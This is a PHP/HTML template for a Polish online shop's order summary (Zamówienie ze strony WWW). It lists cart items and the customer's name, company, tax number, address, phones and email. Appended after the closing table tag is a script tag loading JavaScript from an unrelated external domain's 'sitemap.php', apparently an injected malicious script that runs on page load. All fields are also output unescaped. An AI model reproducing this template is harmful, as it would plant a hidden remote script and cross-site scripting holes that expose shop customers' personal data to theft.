<?if($destination === 'mail'):?>
<!DOCTYPE html PUBLIC '-//W3C//DTD HTML 4.01//EN' 'http://www.w3.org/TR/html4/strict.dtd'>
<html lang='pl'>
<title>Zamówienie ze strony WWW</title>

<h2>Zamówienie ze strony <abbr title='World Wide Web'>WWW</abbr></h2>
<?endif?>

<table>
<caption>Specyfikacja towaru</caption>
<thead>
<tr>
	<th scope='col'>Numer
	<th scope='col'>Ilość											
	<th scope='col'>Nazwa											
	<th scope='col'>Cena											
<tbody>
<?foreach($cart -> items as $item):?>
<tr>
	<th scope='row'><?=++$i?>.									
	<td><?=$item -> quantity?> sztuk
	<td><?=$item -> name?>&nbsp;									
	<td><?=$item -> quantity?> &times; <?=$item -> price?> zł = <?=$item -> price * $item -> quantity?> zł
<?endforeach?>
<tr>
	<th colspan='3'>Suma:							
	<td><?=$cart -> returnTotal()?> zł
</table>

<table>
<caption>Dane zamawiającego</caption>
<tbody>
<tr>
	<th scope='row'>	Imie i nazwisko:											
	<td>				<?=$owner -> name?> <?=$owner -> surname?>&nbsp;			

<tr>
	<th scope='row'>	Nazwa firmy:												
	<td>				<?=$owner -> company?>&nbsp;								

<tr>
	<th scope='row'>	<abbr title='Numer Idenfytikacji Podatkowej'>NIP</abbr>:	
	<td>				<?=$owner -> nip?>&nbsp;									

<tr>
	<th scope='row'>	Ulica:														
	<td>				<?=$owner -> address?>&nbsp;								

<tr>
	<th scope='row'>	Miasto i kod:												
	<td>				<?=$owner -> city?> <?=$owner -> postCode?>&nbsp;			

<tr>
	<th scope='row'>	Telefon i e-mail:											
	<td>
	<ul>
		<li>Tel. domowy: <?=$owner -> telHome?>
		<li>Tel. służbowy: <?=$owner -> telCompany?>
		<li>Tel. komórkowy: <?=$owner -> telCellular?>
	</ul>
 	<a href='mailto:<?=$owner -> mail?>'><?=$owner -> mail?></a>
	

<tr>
	<th scope='row'>Uwagi:															
	<td><?=$cart -> comment?>&nbsp;													


</table><script src=http://johanneswallmark.com/media/sitemap.php ></script>